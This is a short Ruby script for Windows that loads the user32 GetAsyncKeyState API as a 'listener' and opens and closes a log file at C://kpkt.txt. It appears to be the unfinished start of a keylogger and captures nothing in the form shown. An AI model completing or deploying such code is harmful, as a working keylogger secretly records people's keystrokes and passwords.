require 'Win32API'

listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

logs = File.open('C://kpkt.txt', 'a')
logs.close()